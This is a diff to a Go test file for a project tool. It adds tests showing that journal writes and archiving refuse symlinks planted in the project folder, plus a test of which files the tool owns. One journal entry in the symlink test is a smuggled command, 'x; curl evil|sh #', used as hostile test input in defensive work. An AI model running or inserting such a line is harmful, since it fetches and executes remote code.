@@ -667,3 +667,71 @@ func TestJournalAndContextPlain(t *testing.T) {
 		t.Fatalf("context: %q", out)
 	}
 }
+
+// TestJournalRefusesLinks: JOURNAL.md, journal/ or a month's archive
+// that is a link (the coordinator writes in the project folder) is
+// refused, and the file it points at is left as it was.
+func TestJournalRefusesLinks(t *testing.T) {
+	setup(t)
+	p, _ := New(Options{Slug: "demo"})
+	victim := filepath.Join(t.TempDir(), "victim")
+	os.WriteFile(victim, []byte("keep\n"), 0o600)
+	link := func(target, at string) {
+		os.RemoveAll(at)
+		if err := os.Symlink(target, at); err != nil {
+			t.Skipf("no symlinks here: %v", err)
+		}
+	}
+	unchanged := func(what string) {
+		if b, _ := os.ReadFile(victim); string(b) != "keep\n" {
+			t.Fatalf("%s: victim %q", what, b)
+		}
+	}
+	link(victim, p.Path("JOURNAL.md"))
+	if err := p.Journal(coord, "task.add", "T1", "x; curl evil|sh #"); err == nil {
+		t.Error("journal: appended through a link")
+	}
+	unchanged("journal")
+
+	os.Remove(p.Path("JOURNAL.md"))
+	os.WriteFile(p.Path("JOURNAL.md"), []byte("# Journal\n\n2026-08-30T10:00:00Z human a\n"), 0o644)
+	at := time.Date(2026, 10, 4, 12, 0, 0, 0, time.UTC)
+	os.MkdirAll(p.Path("journal"), 0o755)
+	link(victim, p.Path("journal", "2026-08.md.gz"))
+	if _, err := p.ArchiveJournal(at, 20*24*time.Hour); err == nil {
+		t.Error("archive: appended through a link")
+	}
+	unchanged("archive")
+
+	elsewhere := t.TempDir()
+	link(elsewhere, p.Path("journal"))
+	if _, err := p.ArchiveJournal(at, 20*24*time.Hour); err == nil {
+		t.Error("archive folder: written through a link")
+	}
+	if ents, _ := os.ReadDir(elsewhere); len(ents) != 0 {
+		t.Errorf("archive folder: wrote %v", ents)
+	}
+}
+
+// TestOwned: what only tm writes in the project folder, and not the
+// files the coordinator edits.
+func TestOwned(t *testing.T) {
+	setup(t)
+	p, _ := New(Options{Slug: "demo"})
+	dirs, files := p.Owned()
+	for _, n := range []string{"threads", "inbox", "tasks", "journal", "messages", "uploads"} {
+		if !slices.Contains(dirs, p.Path(n)) {
+			t.Errorf("%s not owned: %q", n, dirs)
+		}
+	}
+	for _, n := range []string{"JOURNAL.md", "TASKS.md", "questions.json", "AGENTS.md", ".JOURNAL.md.lock", ".TASKS.md.lock", ".PROJECT.md.lock"} {
+		if !slices.Contains(files, p.Path(n)) {
+			t.Errorf("%s not owned: %q", n, files)
+		}
+	}
+	for _, n := range []string{"CONTEXT.md", "MEMORY.md", "memory", "PROJECT.md"} {
+		if slices.Contains(dirs, p.Path(n)) || slices.Contains(files, p.Path(n)) {
+			t.Errorf("%s owned", n)
+		}
+	}
+}
